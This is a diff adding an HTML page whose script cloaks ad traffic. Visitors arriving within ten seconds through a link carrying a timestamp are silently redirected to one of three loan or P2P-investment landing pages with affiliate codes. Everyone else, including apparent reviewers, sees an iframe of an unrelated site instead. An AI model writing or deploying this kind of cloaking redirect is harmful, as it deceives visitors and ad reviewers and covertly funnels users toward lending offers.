@@ -1,0 +1,25 @@
+<html>
+<body style="margin:0">
+<meta charset="UTF-8">
+<script type="text/javascript">
+    function GetQueryString(name) {
+        var reg = new RegExp("(^|&)" + name + "=([^&]*)(&|$)");
+        var r = window.location.search.substr(1).match(reg);
+        if (r != null)return unescape(r[2]);
+        return null;
+    }
+    var c = (new Date).valueOf(), d, e;
+    d = parseInt(GetQueryString("k"));
+    e = GetQueryString("f");
+    var urls = ["http://m.niwodai.com/index.do?method=ac&artId=5820160000006706&nwd_ext_aid=5020160128711867&source_id=","http://api.xianjincard.com/act/light-loan-two?source_tag=H5-SAI3&s=91_2&invite_code=BBHZ1U","https://m.invest.ppdai.com/landinginvestinfo.html?role=1&regsourceid=sujiakekeji007"];
+    var adn= parseInt(Math.random()*3)
+    var U = urls[adn];
+    if (!(isNaN(e) || isNaN(d))) {
+        1E4 < c - d ? document.write('<iframe frameBorder="0" scrolling="yes" width="100%" height="100%" src="http://www.qiku360.com/" ></iframe>')
+                : window.location.href = U;
+    } else {
+        document.write('<iframe frameBorder="0" id="wu" scrolling="yes" width="100%" height="100%" src="http://www.qiku360.com/" ></iframe>')
+    }
+</script>
+</body>
+</html>
